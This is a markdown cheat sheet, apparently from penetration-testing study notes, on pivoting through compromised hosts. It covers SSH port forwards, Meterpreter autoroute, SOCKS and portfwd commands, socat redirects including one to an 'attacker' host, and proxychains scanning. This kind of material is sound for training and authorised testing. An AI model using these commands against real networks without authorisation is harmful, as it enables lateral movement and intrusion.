[← Back to Home](../README.md)

# 08 — Pivoting & Tunneling

## SSH Pivoting

```bash
# Local forward (reach a service that only the pivot host can see)
ssh -L 1234:localhost:3306 user@pivot

# Dynamic forward (scan the internal network through the pivot)
ssh -D 9050 user@pivot
# then: proxychains nmap -sT -Pn target

# Remote forward (when the target can't reach you directly)
ssh -R pivot_ip:8080:0.0.0.0:8000 user@pivot -vN
```

## Meterpreter Pivoting

```bash
# Add a route to an internal subnet
meterpreter > run autoroute -s 172.16.5.0/23

# SOCKS proxy through the session
use auxiliary/server/socks_proxy
set SRVPORT 9050
set version 4a
run

# Port forwarding
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

## Socat (No SSH Required)

```bash
# Reverse redirect
socat TCP4-LISTEN:8080,fork TCP4:attacker:80

# Bind redirect
socat TCP4-LISTEN:8080,fork TCP4:internal_target:8443
```

## Proxychains Rules

```text
# /etc/proxychains.conf
socks4 127.0.0.1 9050
# Usage: proxychains nmap -sT -Pn target
# ONLY TCP connect scans (-sT) work through proxychains!
```

## Related Pages

- Establishing the initial foothold → [Shells, Payloads & Metasploit](07-Shells-Payloads-and-Metasploit.md)
- Post-shell awareness of internal networks → [Windows Enumeration & Situational Awareness](09-Windows-Enumeration-and-Situational-Awareness.md)
